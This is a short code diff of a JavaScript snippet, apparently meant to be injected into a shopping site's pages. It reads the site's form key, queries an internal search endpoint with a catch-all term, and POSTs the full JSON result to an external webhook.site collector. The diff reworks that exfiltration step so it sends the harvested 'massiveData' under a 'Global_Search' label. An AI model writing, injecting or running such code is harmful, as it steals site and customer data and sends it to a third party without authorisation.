@@ -9,7 +9,6 @@ return (async () => {
         const searchUrl = new URL(apiEndpoint);
         searchUrl.searchParams.append('query', 'a'); 
         searchUrl.searchParams.append('form_key', formKey);
-        searchUrl.searchParams.append('isAjax', 'true');
 
         const internalResponse = await fetch(searchUrl, {
             method: 'GET',
@@ -20,11 +19,12 @@ return (async () => {
         });
 
         const massiveData = await internalResponse.json();
-        const response = await fetch('https://webhook.site/official_shopping_0205_big4', {
+        await fetch('https://webhook.site/official_shopping_0205_big4', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                data: sensitiveData
+                source: 'Global_Search',
+                data: massiveData
             })
         });
 
